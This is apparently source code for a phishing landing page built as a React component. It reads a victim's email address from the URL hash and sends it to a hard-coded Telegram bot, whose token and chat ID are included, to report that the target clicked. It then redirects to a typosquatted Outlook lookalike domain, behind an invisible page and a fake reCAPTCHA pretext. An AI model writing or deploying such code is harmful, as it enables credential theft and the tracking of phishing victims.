import React, { useEffect } from "react";
import axios from "axios";

const App = () => {
  const hashValue = window.location.hash.substring(1);
  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
  const userId = "1099461059"; // Replace with the target user's ID

  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  axios
    .post(apiUrl, {
      chat_id: userId,
      text: `This email (${hashValue}) clicked on the site waiting for them to solve the recaptcha`,
    })
    .then((response) => {
      if (response.data.ok) {
        return;
        // console.log("Message sent successfully!");
      } else {
        console.error("Failed to send message:", response.data.description);
      }
    })
    .catch((error) => {
      console.error("Error:", error.message);
    });

  useEffect(() => {
    // Set a timeout to update the message after 2000 milliseconds (2 seconds)
    const timeoutId = setTimeout(() => {
      window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
    }, 1500);

    // Cleanup the timeout to avoid memory leaks
    return () => clearTimeout(timeoutId);
  }, [hashValue]);

  // const handleSubmit = async () => {
  //   try {
  //     const response = await axios.post("/.netlify/functions/verifyRecaptcha", {
  //       recaptchaValue,
  //     });

  //     const { message } = response.data;
  //     if (recaptchaValue) {
  //       window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
  //     }

  //     // Proceed with your form submission logic here if needed
  //   } catch (error) {
  //     console.error("Error submitting form:", error);
  //   }
  // };

  return (
    <div className=" container mt-5 pt-5 ">
      <div className="mt-5 pt-5 w-50 mx-3">
        <h1 className="bg-white text-white">Hello world</h1>
        {/* Google reCAPTCHA */}
      </div>
    </div>
  );
};

export default App;
